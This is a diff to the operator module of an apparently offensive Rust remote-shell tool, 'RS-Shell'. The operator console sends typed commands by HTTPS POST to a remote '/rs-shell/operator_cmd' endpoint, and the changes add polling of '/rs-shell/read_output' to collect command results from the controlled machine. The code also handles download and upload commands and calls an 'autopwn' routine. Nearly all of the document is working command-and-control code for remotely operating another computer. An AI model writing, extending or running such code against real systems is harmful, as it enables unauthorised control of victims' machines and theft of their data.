@@ -50,7 +50,7 @@ pub fn operator(ip_addr: &str) -> Result<(), Box<dyn Error>> {
             io::stdout().flush().unwrap();
             let mut cmd = String::new();
             io::stdin().read_line(&mut cmd).expect("[-] Input issue");
-            cmd.push('\0');
+            cmd = cmd.trim_end().to_string();
 
             // Check for help command
             if cmd.as_str().starts_with("help") {
@@ -59,7 +59,7 @@ pub fn operator(ip_addr: &str) -> Result<(), Box<dyn Error>> {
             }
 
             // Cmd handling
-            if cmd.trim_end_matches('\0').trim_end().ne("") {
+            if cmd.trim_end().ne("") {
                 // Check for download/upload commands
                 if cmd.as_str().starts_with("download") {
                     let path: Vec<&str> = cmd.split(' ').collect();
@@ -255,20 +255,18 @@ pub fn operator(ip_addr: &str) -> Result<(), Box<dyn Error>> {
                         .eq_ignore_ascii_case("42")
                     {
                         autopwn::autopwn();
-                        continue;
                     }
                     continue;
-                } else if cmd.as_str().starts_with("exit") || cmd.as_str().starts_with("quit") {
+                } else if cmd.as_str().trim_end() == "exit" || cmd.as_str().trim_end() == "quit" {
                     url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
                     response = client.post(url).body(cmd).send()?;
-
                     if response.status().is_success() {
+                        let body = response.text()?;
+                        log::info!("{}", body);
                         println!("[+] Goodbye my friend <3");
-                        break;
-                    } else {
-                        log::error!("RS-Shell error: {}", response.status());
                     }
-                    continue;
+
+                    break;
                 } else {
                     // To run a cmd command
                     url = format!("https://{}/rs-shell/operator_cmd", ip_addr);
@@ -276,7 +274,19 @@ pub fn operator(ip_addr: &str) -> Result<(), Box<dyn Error>> {
 
                     if response.status().is_success() {
                         let body = response.text()?;
-                        println!("{}", body);
+                        log::debug!("{}", body);
+
+                        // Retrieve the output
+                        std::thread::sleep(std::time::Duration::from_secs(4));
+                        url = format!("https://{}/rs-shell/read_output", ip_addr);
+                        response = client.get(url).send()?;
+
+                        if response.status().is_success() {
+                            let body = response.text()?;
+                            println!("{}", body);
+                        } else {
+                            log::error!("RS-Shell error: {}", response.status());
+                        }
                     } else {
                         log::error!("RS-Shell error: {}", response.status());
                     }
